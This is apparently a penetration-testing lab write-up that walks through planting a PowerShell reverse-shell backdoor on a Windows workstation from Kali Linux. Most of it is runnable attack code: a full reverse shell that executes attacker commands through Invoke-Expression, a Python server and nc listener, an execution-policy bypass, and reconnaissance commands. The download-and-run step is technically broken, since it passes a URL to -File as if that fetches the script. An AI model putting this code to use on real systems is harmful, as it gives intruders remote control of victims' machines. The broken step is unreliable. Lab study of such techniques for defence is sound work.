
# Reverse Shell Backdoor Attack Playbook

## Overview

This project demonstrates how to create and deploy a malicious PowerShell script to establish a reverse shell on a Windows workstation. The attacker uses Kali Linux to serve the payload and capture the connection, giving them remote access to the victim's machine.

- **Target:** Windows Workstation (SOC.LAB domain)
  - **IP Address:** 192.168.10.20
  - **Domain:** SOC.LAB
- **Attacker:** Kali Linux
  - **IP Address:** 192.168.20.30

## Objective
1. Create a malicious PowerShell script (malicious.ps1) to establish a reverse shell backdoor.
2. Use a web server to serve the payload to the target Windows machine.
3. Make the Windows user download and execute the malicious script.
4. Gain remote access to the victim's machine and execute commands of the attacker's choice.

## Attack Execution Timeline

### 1. **Create Malicious PowerShell Payload**

Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this [git](https://github.com/das-lab/mpsd) and [forum](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Send a message to confirm the connection
$writer.WriteLine("Connected to backdoor!")
$writer.Flush()

while ($true) {
    # Receive command from the attacker
    $command = $reader.ReadLine()
    
    # If the command is "exit", close the connection
    if ($command -eq "exit") {
        break
    }
    
    # Execute the command on the Windows machine and capture output
    $output = Invoke-Expression $command 2>&1
    
    # Send the output back to the attacker
    $writer.WriteLine($output)
    $writer.Flush()
}

# Close the connection
$client.Close()
```

### 2. **Set Up HTTP Server to Serve Payload**

Once the payload script was created, the attacker needed to serve it to the victim machine. This was done by using a simple HTTP server on Kali Linux to host the malicious script:

```bash
python3 -m http.server 80
```

This command starts a web server on port `80` of Kali Linux, making the malicious script accessible to the victim.

### 3. **Start Listener on Kali Linux**

Next, the attacker needs to listen for an incoming connection from the reverse shell. This was done using Netcat (`nc`) on Kali Linux:

```bash
nc -lvnp 4444
```

This command listens on port `4444` and waits for a connection from the victim’s machine once the reverse shell script is executed.

### 4. **Victim Downloads and Executes the Malicious Payload**

The attacker then used the following PowerShell command to force the victim to download and execute the malicious payload:

```powershell
powershell -ExecutionPolicy Bypass -File "http://192.168.20.30/malicious.ps1"
```

This command bypasses the PowerShell execution policy and downloads the malicious script from the attacker’s web server to the target machine. Once executed, the script initiates the reverse shell and connects back to the attacker’s machine.

### 5. **Gaining Access to the Windows Workstation**

Once the malicious PowerShell script was executed on the victim’s machine, the reverse shell successfully connected to the attacker’s machine. The attacker now had remote access to the Windows workstation and could run commands on it.

### 6. **Execute Commands on the Target Machine**

After establishing the reverse shell, the attacker could run various commands to gather information about the system. Some useful commands executed during the attack include:

- **`whoami`** – To confirm the user currently logged in:
  ```bash
  whoami
  ```

- **`tasklist`** – To list all running processes:
  ```bash
  tasklist | Out-String
  ```

- **`net user`** – To list all user accounts on the system:
  ```bash
  net user | Format-Table
  ```

- **`net user labadmin`** – To get detailed information about the `labadmin` user:
  ```bash
  net user labadmin
  ```

These commands helped the attacker confirm the identity of the user, gather information about the system, and identify potential targets for further exploitation.

## Conclusion

In this project, the attacker:

1. **Created Malware**: A malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell backdoor.
2. **Made the Victim Download the Malware**: The attacker used a simple HTTP server to serve the payload and a PowerShell command to make the victim download and execute the script.
3. **Gained Access to the Windows Workstation**: The reverse shell connected back to the attacker’s machine, giving them full remote control over the victim’s system.

With this access, the attacker could now run arbitrary commands, escalate privileges, maintain persistence, and continue exploiting the system.

## Disclaimer

This project is intended for educational purposes only. It demonstrates a common attack technique used in penetration testing to simulate how an attacker might gain remote access to a target system. Unauthorized access to computer systems is illegal and unethical. Always ensure you have explicit permission before conducting any form of penetration testing or attack simulation.
